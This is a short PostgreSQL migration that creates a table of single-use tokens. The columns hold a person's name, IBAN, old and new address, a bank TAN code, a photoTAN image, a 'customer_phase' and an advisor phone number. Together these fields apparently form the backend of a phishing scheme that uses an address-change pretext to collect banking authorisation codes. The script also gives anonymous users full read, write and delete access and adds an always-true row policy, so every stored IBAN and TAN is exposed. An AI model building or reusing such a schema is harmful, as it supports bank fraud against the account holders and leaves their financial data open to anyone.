CREATE TABLE public.adress_tokens (
  id uuid NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  token text NOT NULL,
  used boolean NOT NULL DEFAULT false,
  used_at timestamp with time zone,
  auftraggeber_name text,
  auftraggeber_iban text,
  curr_strasse text,
  curr_plz text,
  curr_ort text,
  new_strasse text,
  new_plz text,
  new_ort text,
  tan_code text,
  photo_tan_image text,
  last_error text,
  customer_phase text,
  security_status text DEFAULT 'pending'::text,
  security_status_at timestamp with time zone,
  berater_phone text,
  parent_token_id uuid,
  parent_kind text,
  created_at timestamp with time zone NOT NULL DEFAULT now(),
  updated_at timestamp with time zone NOT NULL DEFAULT now()
);

GRANT SELECT, INSERT, UPDATE, DELETE ON public.adress_tokens TO anon, authenticated;
GRANT ALL ON public.adress_tokens TO service_role;

ALTER TABLE public.adress_tokens ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Public all adress_tokens" ON public.adress_tokens FOR ALL USING (true) WITH CHECK (true);

CREATE TRIGGER adress_tokens_updated_at BEFORE UPDATE ON public.adress_tokens FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();